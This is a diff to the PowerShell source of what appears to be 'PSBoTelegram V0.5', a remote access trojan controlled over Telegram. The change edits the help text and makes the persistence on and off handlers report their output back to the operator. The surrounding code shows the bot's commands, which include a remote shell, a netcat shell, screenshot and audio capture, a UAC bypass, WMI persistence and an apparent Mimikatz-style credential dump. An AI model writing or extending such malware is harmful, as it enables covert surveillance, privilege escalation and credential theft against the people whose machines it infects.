@@ -194,7 +194,7 @@ Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "nam
 }}}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
- $help = "PSBoTelegram V0.5`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /Remove-Persistence`n[*] /MimiGatoz"
+ $help = "PSBoTelegram V0.5`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
@@ -209,8 +209,8 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ","";graba-audio -botkey $botkey -chat_id $chat_id -segundos $segundos}
  if ($comando -like "/Bypassuac" -and $first_connect -gt 5) {$texto = "Ejecutado el BypassUAC, espere la nueva conexion del BOT";envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $id = (Get-Process powershell).Id;$agent_bot = create_agent -botkey $botkey -chat_id $chat_id; BypassUAC-CyberVaca -comando $agent_bot ;  Stop-Process -id $id}
  if ($comando -like "/Persistence") {$texto = "La funcion de persistencia se ejecuta: `n /Persistence On`n /Persistence Off"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Persistence On") {persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Persistence Off") {remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Persistence On") {$texto = persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/MimiGatoz") {mimigatoz}
 
 }
